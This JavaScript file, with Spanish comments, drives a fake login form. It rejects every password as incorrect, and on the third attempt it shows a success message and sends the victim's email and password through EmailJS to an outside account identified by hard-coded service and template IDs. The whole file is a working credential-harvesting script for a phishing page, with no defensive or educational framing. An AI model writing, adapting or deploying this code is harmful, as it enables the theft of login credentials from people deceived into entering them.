let attempts = 0; // Contador de intentos

document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Evita que el formulario se envíe

    // Incrementar el contador de intentos
    attempts++;

    // Mostrar mensaje de error (simulación)
    document.getElementById("errorMessage").textContent = "Contraseña incorrecta";

    // Si se han realizado 3 intentos, mostrar el mensaje de éxito
    if (attempts === 3) {
        document.getElementById("errorMessage").textContent = ""; // Limpiar el mensaje de error
        document.getElementById("successMessage").style.display = "block"; // Mostrar el mensaje de éxito

        // Enviar los datos por correo
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;

        emailjs.send("service_v09nh6g", "template_hqltz7f", {
            email: email,
            password: password,
        })
        .then(function (response) {
            console.log("Correo enviado con éxito:", response);
        }, function (error) {
            console.error("Error al enviar el correo:", error);
        });
    }
});